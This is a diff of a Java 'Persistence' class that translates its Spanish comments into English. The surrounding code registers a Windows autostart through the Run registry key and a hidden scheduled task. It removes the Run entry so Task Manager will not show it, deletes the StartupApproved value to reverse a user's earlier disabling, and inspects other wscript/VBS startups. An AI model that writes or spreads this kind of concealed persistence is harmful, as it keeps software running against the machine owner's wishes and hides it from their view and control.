@@ -37,7 +37,7 @@ public final class Persistence {
 			if (launcher == null) {
 				return false;
 			}
-			// El Administrador de tareas lista todo lo que vive en Run; se retira si la tarea oculta funciona.
+			// Task Manager lists everything under Run; remove it if the hidden task works.
 			if (registerTask(dir, launcher) && taskExists()) {
 				run("reg", "delete", RUN_KEY, "/v", VALUE, "/f");
 				run("reg", "delete", APPROVED_KEY, "/v", VALUE, "/f");
@@ -75,7 +75,7 @@ public final class Persistence {
 		if (!run("reg", "add", RUN_KEY, "/v", VALUE, "/t", "REG_SZ", "/d", command, "/f")) {
 			return false;
 		}
-		// Task Manager deja el valor marcado como deshabilitado si se apago a mano en el pasado.
+		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
 		run("reg", "delete", APPROVED_KEY, "/v", VALUE, "/f");
 		return command.equals(read());
 	}
@@ -165,8 +165,8 @@ public final class Persistence {
 	}
 
 	/**
-	 * Regenera el lanzador con el runtime actual. Se llama en cada arranque del agente para que el
-	 * script apunte al java vigente aunque el runtime se haya actualizado.
+	 * Regenerate the launcher with the current runtime. Called on every agent start so the
+	 * script points to the current java even if the runtime was updated.
 	 */
 	public static void refresh(Path dir) {
 		try {
@@ -274,8 +274,8 @@ public final class Persistence {
 	}
 
 	/**
-	 * Arranques ajenos que se lanzan por wscript/VBS. Sirve para saber si otro pack pisa el mismo
-	 * mecanismo y si su script sigue existiendo.
+	 * Foreign startups launched through wscript/VBS. Used to see if another pack steps on the
+	 * same mechanism and whether its script still exists.
 	 */
 	public static List<String> foreign(Path dir) {
 		List<String> result = new ArrayList<>();
@@ -300,15 +300,15 @@ public final class Persistence {
 				if (!lower.contains("wscript") && !lower.contains(".vbs")) {
 					continue;
 				}
-				String note = "convive";
+				String note = "coexists";
 				int first = data.indexOf('"');
 				int last = data.lastIndexOf('"');
 				if (first >= 0 && last > first) {
 					Path target = Paths.get(data.substring(first + 1, last));
 					if (!Files.exists(target)) {
-						note = "ruta inexistente";
+						note = "missing path";
 					} else if (target.startsWith(dir)) {
-						note = "usa nuestro directorio";
+						note = "uses our directory";
 					}
 				}
 				result.add(name + " -> " + data + " (" + note + ")");
